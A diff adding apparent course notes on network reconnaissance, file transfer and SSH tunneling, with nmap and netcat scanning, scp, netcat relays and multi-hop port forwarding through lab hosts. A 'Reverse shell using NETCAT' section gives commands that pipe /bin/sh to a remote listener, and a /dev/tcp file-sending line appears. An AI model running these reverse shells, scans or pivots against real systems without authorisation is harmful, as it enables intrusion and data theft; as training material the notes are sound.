@@ -1,0 +1,450 @@
+Net Recon
+File transferring and moving data
+scp
+tunnels
+  local forward
+  remote
+multiple hop tunnels
+connecting tunnels
+
+# Day 3
+# Network Reconnaissance
+
+https://github.com/SoulPiercer/COSC-Notes
+
+
+1.) Passive External
+    OSINT:
+      Zone Transfers
+      DNS Lookups
+      Web Recon
+      Google Searches
+      Shodan
+2.) Active External
+    NMAP scans
+    Ping scans
+    traceroute
+    bannergrabbing
+3.) Passive Internal  
+    Arp cache
+    Running Services
+    Known Routes
+    Interface IP's
+    Open Ports
+    other users on box
+    DNS checks /etc/hosts
+    and /etc/rsolv.conf
+4.) Active Internal
+    DNS Queries
+    Ping sweep /ARP Requests
+
+## Passive
+
+whois (domain)
+
+
+Dig is a tool that returns key DNS information and can be used to supplement the query for specific records.
+
+instructor@net1:~$ dig ccboe.net
+instructor@net1:~$ dig ccboe.net MX
+instructor@net1:~$ dig ccboe.net SOA
+
+Netcraft
+
+## Scanning
+nmap -A -T4 --min-rate 10000 -Pn <target Host/netork> -vvvv
+
+
+
+nmap -PS21-50 55.66.77.22
+
+### netcat script:
+scan.sh
+
+    #!/bin/bash
+    echo "Enter network address (e.g. 192.168.0): "
+    read net
+    echo "Enter starting host range (e.g. 1): "
+    read start
+    echo "Enter ending host range (e.g. 254): "
+    read end
+    echo "Enter ports space-delimited (e.g. 21-23 80): "
+    read ports
+    for ((i=$start; $i<=$end; i++))
+    do
+        nc -nvzw1 $net.$i $ports 2>&1 | grep -E 'succ|open'
+    done
+    # (-v) running verbosely (-v on Linux, -vv on Windows),
+    # (-n) not resolving names. numeric only IP(no D.S)
+    # (-z) without sending any data. zero-I/O mode(used for scanning)
+    #(-w1) waiting no more than 1second for a connection to occur
+    # (2>&1) redirect STDERR to STDOUT. Results of scan are errors and need to redirect to output to grep
+    # (-E) Interpret PATTERN as an extended regular expression
+    # ( | grep open) for Debian to display only open connections
+    # ( | grep succeeded) for Ubuntu to display only the open connections
+
+### Passive Internal Commands
+      cat /etc/hosts
+      cat /etc/resolv.conf
+      netstat -ntulp      # Check open ports (deprecated)
+      ss -ntulp           # Check open ports
+      ps -elf / top       # Check all running processes
+      w/who               # Identify users logged onto box
+      ifconfig            # Interface IP's (deprecated)
+      ip address          # Interface IP's
+      ip neighbor         # Arp Cache
+      ip route            # ip routes
+
+## Mapping
+
+    0.0.0.0:[port #] will allow access to port from any ip address
+    
+    6010, 6011, 6012 == x11 forwarding
+
+# Host Discovery: 
+        Find: Hostname ; IpAdress ; ports
+
+## Ping sweep
+        for i in {1..254}; do ping -c 1 -W 1 10.1.1.$i | grep 'from'; done
+## Nmap
+        nmap -vv ip/cider
+        #Default is top 1000 most used ports, scarcely use default
+        #Most devices will use 21,23,80 unless otherwise given a hint
+        nmap -Pn 172.16.20.0/24 -p 21,22,23,80 | egrep "open" -C4
+        nmap -Pn 172.16.20.0/24 -p 21,22,23,80 | egrep "filtered" -C4
+
+Banner Grabbing:
+  nc  <ip> <port>
+
+## Web Requests:
+    wget -r <ip>:<webport>   # gets content of a webpage and saves it file
+    wget -r ftp://<ip>
+    curl <ip>     # gets url of webpage
+## Telnet
+telnet <alternate Port>
+# Internal Discovery
+
+## ftp server
+    ftp <ip>
+    user: anonymous, no password
+## Routers:
+      sh config   # bgp 10 to find external networks  # 
+      show int    # Find internal network connections
+      hostname
+      ss -ntlp
+      
+## Netcat to get information being sent from sockets on each port ( -u to specify udp)
+
+
+# Day 4
+# Data Transfer, Movement and Redirection
+
+## Data Transfer
+  Methods
+  * TFTP
+  * FTP
+      * Active
+      * Passive
+  * SFTP
+  * SCP
+
+  ### TFTP
+  Trivial File Transfer Protocol
+  * RFC 1350 Rev2
+  * UDP transport
+  * insecure
+  * no terminal communication()
+
+  ### FTP
+  * RFC 959
+  * TCP transport across multiple connections
+  * Control Conection (21)/ Data Connection (20)
+  * insecure
+  * Anonymous login
+
+  Commands:
+
+      Passive  # will turn Passive mode on or off
+      # Passive vs. Active mode will determine who initiated the connection
+      # Active : ftp server will initiate the connection
+      # Passive: Our host machine will initiate the conncection.
+      get <file>
+      wget -r ftp://<ip>  # Run instead of logging into box. 
+      
+  ### SFTP
+  Secure File Transfer Protocol
+  * TCP transpot (TCP port 22)
+  * adds FTP like services to SSH
+  * Interactive terminal access
+  * Authentication through sign in
+
+  ### FTPS
+  File Transfer Prototcol Secure
+  * TCP transport ( TCP port 443 )
+  * Adds SSL/TLS encryption to FTP
+  * Authentication
+  * Interactive Terminal access
+
+  ### SCP
+  Secure Copy Protocol
+  * TCP Transport (TCP port 22)
+  * non interactive
+  * Authentication
+
+  Download a file from a remote directory to a local Directory
+
+    $ scp student@172.16.82.106:secretstuff.txt /home/student
+
+  Upload a file to a remote directory from a local directory
+
+    $ scp secretstuff.txt student@172.16.82.106:/home/student
+
+  Copy a file from a remote host to a separate remote host
+
+    $ scp -3 student@172.16.82.106:/home/student/secretstuff.txt student@172.16.82.112:/home/student
+
+
+#### SCP Syntax w/ alternate SSHD (Alternate ssh port):
+  * Download a file from a remote directory to a local directory
+
+        $ scp -P 1111 student@172.16.82.106:secretstuff.txt /home/student
+
+  * Upload a file to a remote directory from a local directory
+
+        $ scp -P 1111 secretstuff.txt student@172.16.82.106:/home/student
+
+#### SCP Syntax through a tunnel
+
+ssh student@172.16.82.106 -L 1111:localhost:22 -NT
+
+* Download a file from a remote directory to a local directory
+
+      $ scp -P 1111 student@localhost:secretstuff.txt /home/student
+
+* Upload a file to a remote directory from a local directory
+
+      $ scp -P 1111 secretstuff.txt student@localhost:/home/student
+
+
+## Network Tunneling
+
+## Traffic Redirection
+Netcat Listener always needs to be set up first
+### NETCAT: Client to listener file transfer
+
+    Client (sends file): nc 10.2.0.2 9001 < file.txt
+    Listener (receive file): nc -l -p 9001 > newfile.txt
+    
+### NETCAT: Listener to Client file transfer
+
+    Listener (sends file): nc -l -p 9001 < file.txt
+    Client (receive file): nc 10.2.0.2 9001 > newfile.txt
+
+
+### NETCAT Relay Demos
+
+On Client Relay:
+    
+    # Internet host: 
+    nc 10.1.0.2  9002 (middle ip from internet host)
+    
+    # Middle Man: 
+    mknod mypipe p
+    nc -lp 9002 0< mypipe | nc -lp 9001 1> mypipe  ## Relay on the middle man
+
+    # End point
+    nc 10.2.0.2 9001 (Ip of middle man from end point)
+    
+  ####  Reverse setup
+  
+  * Internet host
+
+         nc -lp 1234
+  * end host
+
+        nc -lp 4321
+  * Middle man
+    
+        mknod mypipe p
+        nc 10.10.0.40 1234 0<mypipe | nc 192.168.1.10 4321 1> mypipe
+    
+On Listener2 (sends info):
+
+    nc -l -p 9002 < infile.txt
+
+On Listener1 (receives info):
+
+    nc -l -p 9001 > outfile.txt
+
+Writes the output to listener1 and listener2 through the named pipe
+
+
+### File Transfer with /dev/tcp
+
+On the receiving box:
+
+    nc -l -p 1111 > file.txt
+
+On the sending box:
+
+    cat file.txt > /dev/tcp/10.2.0.2/1111
+
+This method is useful for host that does not have NETCAT available.
+
+### Reverse shell using NETCAT
+
+When shelled into the remote host using -c :
+
+    nc -c /bin/sh <your ip> <any unfiltered port>
+
+You could even pipe BASH through NETCAT.
+
+    /bin/sh | nc <your ip> <any unfiltered port>
+
+Then listen for the shell.
+
+    nc -l -p <same unfiltered port> -vvv
+
+You can also listen using the -e with NETCAT.
+
+    nc -l -p <any unfiltered port> -e /bin/bash
+# Day 5
+
+## Network Tunneling
+
+### SSH
+  Used for tunneling
+
+  * SSH Port Forwarding
+
+          allows for tunneling of other services
+  * Local Port Forwarding
+    Creates a local port (1111) on the local host that forwards to a target machine’s port 80.
+    
+          ssh -p <optional alt port> <user>@<pivot ip> -L <local bind port>:<tgt ip>:<tgt port> -NT
+          ssh student@172.16.82.106 -L 1111:localhost:80 -NT
+    
+          or
+
+          ssh -L <local bind port>:<tgt ip>:<tgt port> -p <alt port> <user>@<pivot ip> -NT
+          ssh -L 1111:localhost:80 student@172.16.82.106 -NT
+          Test connection from the host machine:
+                wget -r localhost:1111
+    
+    * SSH Local Port Forwarding Through a Local Port
+   
+          Internet Host:
+          ssh student@172.16.1.15 -L 1111:172.16.40.10:22 -NT
+          ssh student@localhost -p 1111 -L 2222:172.16.82.106:80 -NT
+          firefox localhost:2222
+  ### SSH Dynamic Port Forwarding
+   
+  ssh -D <port> -p <alt port> <user>@<pivot ip> -NT
+        * Proxychains default port is 9050
+        * Allows the use of scripts and other userspace programs through the tunnel.
+        * SSH Dynamic Port Forwarding 1-Step
+     
+              Blue Private Host-1:
+              ssh student@172.16.82.106 -D 9050 -NT
+
+              proxychains ./scan.sh
+              proxychains ssh student@10.10.0.40
+
+  * SSH Dynamic Port Forwarding 2-Step
+
+              Blue Private Host-1:
+              ssh student@172.16.82.106 -L 1111:10.10.0.40:22 -NT
+              ssh student@localhost -D 9050 -p 1111 -NT
+
+              proxychains curl ftp://www.onlineftp.ch
+              proxychains wget -r www.espn.com
+              proxychains ./scan.sh
+              proxychains ssh student@172.16.101.2
+
+### Chainging tunnels
+* Three hosts
+  * host -> pivot ip -> tgt ip
+  * host    tolby       colby
+
+         H> ssh toby@<pivot ip> -L 42100:<tgt ip>:<tgt port> -NT
+         H> ssh -p 42100 colby@127.0.0.1
+  allows for ssh connection to colby from internet host machine.
+  * 4 Hosts
+  * host - > ip -> ip -> tgt ip
+  * host    tolby  colby  steve
+  
+        h> ssh toly@tolby -L 42100:colby:22 -NT
+        h> ssh -p 42100 colby@127.0.0.1 -L 42001:steve:23 -NT
+        test connection: telent loopback 42100
+            ehlo
+
+### Remote Port Forwarding -R
+Since we have ssh connection to colby, but not steve, we need to create a tunnel to forward traffic from port 42199 on colby to steve open an ssh connection on steve 
+      
+      steve> ssh colby@colby_ip -R 42199:127.0.0.1:22 -NT
+
+ssh into colby and then forward traffic from port 42101 on internet host to loopback:42199 on colby
+
+      h> ssh -p 42100 colby@127.0.0.1 -L 42102:127.0.0.1:42199 -NT
+
+  Test ssh conncetion to steve
+  
+      h> ssh -p 42102 steve@127.0.0.1
+
+Creat remote port forwarding from steve to dj
+
+      steve> ssh steve@127.0.0.1 -R 42198:dj:25 -NT 
+      steve> telnet 127.0.0.1 42198
+          ehlo
+Local Port forwarding from host to steve to allow connection to dj
+  
+      h> ssh -p 42102 steve@127.0.0.1 -L 42103:127.0.0.1:42198 -NT
+      h> telnet 127.0.0.1 42103
+          ehlo
+Dynamic Port forwarding to Steve
+
+    h> ssh -p 42102 steve@127.0.0.1 -D 9050 -NT
+    h> proxychaings wget -r 127.0.0.1 
+
+    h> proxychains nmap -Pn <bart ip> 
+    h> proxychains wget -r ftp://Bart
+    h> proxychains wget -r Bart
+    h> proxychaings telnet Bart  # used just to look around 
+
+    steve> ssh colby@colby ip -R 42197:Bart:23 -NT
+    Test : colby > telnet 127.0.0.1 42197
+
+    h> ssh -p 42100 colby@127.0.0.1 -L 42104:colby_ip:42194 # Takes us to telnet session on bart ip
+    Test: h> telnet 127.0.0.1 42104  # telnet from host to Bart
+
+Remote port forward from bart back to steve
+
+    Bart> ssh steve@steve_ip -R 42196:127.0.0.1:22 -NT
+    h> ssh -p 42102 steve@127.0.0.1 -L 42105:127.0.0.1:42196 -NT 
+SSH from host to Bart 
+
+    H> SSH -P 42105 Bart@127.0.0.1
+
+
+    
+Now, we can ssh from the local host into steve, from there, we can use remote port forwarding to connect to additional hosts down the line. 
+
+  * 5 Hosts
+  * host -> ip -> ip -> ip -> tgt ip
+  * host    toly  colby  steve  bart
+
+         
+
+
+### Remote Port FOrwarding
+
+      ssh -p <optional alt port> <user>@<remote ip> -R <remote bind port>:<tgt ip>:<tgt port> -NT
+
+      or
+      
+      ssh -R <remote bind port>:<tgt ip>:<tgt port> -p <alt port> <user>@<remote ip> -NT
+
+
+
+  ssh -L 1111:localhost:22 cctc@10.50.1.150 -NT 
+  ssh -L 2222:100.1.1.2:22 cctc@localhost -p 1111
